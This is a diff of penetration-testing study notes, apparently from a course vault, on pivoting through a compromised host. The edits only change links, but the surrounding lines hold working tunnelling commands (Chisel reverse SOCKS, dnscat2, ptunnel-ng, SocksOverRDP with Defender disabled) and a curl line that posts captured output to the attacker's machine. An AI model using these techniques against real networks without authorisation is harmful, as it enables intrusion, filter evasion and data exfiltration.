@@ -2,7 +2,7 @@
 
 Part of [[DECISION TREE]]. Use this when you have a foothold on a pivot host and need to reach a host or service that Kali cannot connect to directly.
 
-For exact syntax, see [[Port Redirection and SSH Tunneling (Command Appendix)]]. For command teardowns, see [[Pivoting & Tunneling (Breakdowns)]]. For the full module walkthrough, see [[Port Redirection and SSH Tunneling]].
+For exact syntax, see [[Port Redirection and SSH Tunneling]]. For command teardowns, see [[Pivoting & Tunneling (Breakdowns)]]. For the full module walkthrough, see [[19. Port Redirection and SSH Tunneling|Port Redirection and SSH Tunneling]].
 
 ---
 
@@ -143,7 +143,7 @@ run autoroute -s <target-subnet>/<mask>
 
 → proxychains.conf: `socks4 127.0.0.1 9050`, then `proxychains nmap -sT -Pn -n ...` as normal.
 → Pros: no SSH server needed, autoroute handles routing automatically.
-→ Full syntax: [[Port Redirection and SSH Tunneling (Command Appendix)#Meterpreter Tunneling (autoroute + socks_proxy)|Command Appendix]]
+→ Full syntax: [[Port Redirection and SSH Tunneling#Meterpreter Tunneling (autoroute + socks_proxy)|Command Appendix]]
 
 ---
 
@@ -165,7 +165,7 @@ When the target environment has strict egress filtering, SSH may not work. Match
 **Chisel reverse:** `chisel server --reverse` on Kali, `chisel client <kali-ip>:PORT R:socks` on pivot, creates SOCKS5 on Kali port 1080.
 → Both require updating proxychains.conf (socks4 9050 for Rpivot, socks5 1080 for Chisel).
 → SSH through SOCKS doesn't use proxychains. Use `ProxyCommand` with ncat instead: `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@host`
-→ Full syntax: [[Port Redirection and SSH Tunneling (Command Appendix)#Chisel Reverse SOCKS (HTTP Tunnel. DPI Bypass, Server on Kali)|Command Appendix]], [[Chisel]]
+→ Full syntax: [[Port Redirection and SSH Tunneling#Chisel Reverse SOCKS (HTTP Tunnel. DPI Bypass, Server on Kali)|Command Appendix]], [[Chisel]]
 
 **glibc mismatch on older targets:** Newer Kali builds Chisel with Go 1.20+ which requires glibc 2.32/2.34. If the pivot has an older glibc, download the Go 1.19 compiled release: `wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz`. Detect using the error collection pattern: `<cmd> &> /tmp/out; curl --data @/tmp/out http://<kali>:<port>/`
 
@@ -176,7 +176,7 @@ When the target environment has strict egress filtering, SSH may not work. Match
 → Very slow. Session drops after ~20 unanswered DNS queries, run `window -i 1` and `listen` immediately on session connect.
 → **Port forwarding through DNS tunnel:** `listen [0.0.0.0:]<localport> <rhost>:<rport>`, like ssh -L. Use `0.0.0.0` if the destination tool (e.g. Kali) needs to connect to the auth NS host's port rather than localhost.
 → **When tool hardcodes 127.0.0.1:** combine dnscat2 `listen 0.0.0.0:PORT` on the auth NS with `ssh -fNL PORT:127.0.0.1:PORT user@auth-ns-host` on Kali to bridge the port to Kali's loopback.
-→ Full syntax: [[Port Redirection and SSH Tunneling (Command Appendix)#dnscat2 Linux Setup (Auth NS + Binary Client)|Command Appendix]], [[Dnscat2]]
+→ Full syntax: [[Port Redirection and SSH Tunneling#dnscat2 Linux Setup (Auth NS + Binary Client)|Command Appendix]], [[Dnscat2]]
 
 ### Only ICMP outbound allowed → ptunnel-ng
 
@@ -184,14 +184,14 @@ When the target environment has strict egress filtering, SSH may not work. Match
 → Build statically on Kali (autogen.sh sed patch), transfer to pivot, run server mode.
 → Client creates local TCP port (e.g. :2222) that maps through ICMP to pivot SSH port 22.
 → SSH through it: `ssh -p2222 -lubuntu 127.0.0.1`, then add `-D 9050` for proxychains.
-→ Full syntax: [[Port Redirection and SSH Tunneling (Command Appendix)#ptunnel-ng (ICMP Tunneling)|Command Appendix]]
+→ Full syntax: [[Port Redirection and SSH Tunneling#ptunnel-ng (ICMP Tunneling)|Command Appendix]]
 
 ### Only RDP accessible (Windows pivot, no outbound TCP/SSH) → SocksOverRDP
 
 → Loads a DLL into mstsc.exe that creates a SOCKS proxy via RDP virtual channel.
 → Proxifier on the pivot host routes new mstsc.exe connections through the channel.
 → Requires admin on pivot; Windows Defender must be disabled (flags the DLL/EXE).
-→ Full syntax: [[Port Redirection and SSH Tunneling (Command Appendix)#SocksOverRDP + Proxifier (Windows-Only Multi-Hop via RDP)|Command Appendix]]
+→ Full syntax: [[Port Redirection and SSH Tunneling#SocksOverRDP + Proxifier (Windows-Only Multi-Hop via RDP)|Command Appendix]]
 
 ---
 
